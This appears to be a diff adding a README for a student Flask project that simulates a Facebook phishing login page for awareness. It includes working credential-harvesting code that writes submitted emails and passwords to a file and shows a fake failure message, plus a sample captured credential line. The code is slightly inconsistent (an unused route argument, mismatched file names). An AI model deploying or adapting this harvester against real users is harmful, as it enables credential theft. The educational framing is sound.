@@ -1,0 +1,51 @@
+Phishing Login Page Simulation
+
+Objective:to Understand how phishing attacks mimic trusted services like Facebook.
+
+ Project Overview
+Built using Flask (Python):
+
+from flask import Flask, render_template, request
+
+app = Flask(__name__)  # Create a Flask app instance
+
+
+@app.route("/")
+def login():
+    return render_template("login.html")
+
+
+@app.route("/login", methods=["POST"])
+def handle_login(id):
+    email = request.form["email"]
+    password = request.form["pass"]
+
+
+    with open("credentials.txt", "a") as file:
+        file.write(f"{email} - {password}\n")
+
+    return "Login failed. Please try again."
+
+if __name__ == "__main__":
+    app.run(debug=True)
+
+2.not hosted just tried locally for legaL purpose
+
+3.Captures test credentials in `captured.txt`
+
+stfsrgt@gmail.com - 12345
+
+
+ Legal Use Notice
+Used only for educational testing and awareness. No real user data collected.
+
+ Screenshot:
+
+Key Learnings
+How phishing websites trick users
+Importance of URL validation
+Why browsers flag such pages
+
+Awareness Message
+"Always check the URL and enable 2FA. Phishing is the most common initial attack vector."
+
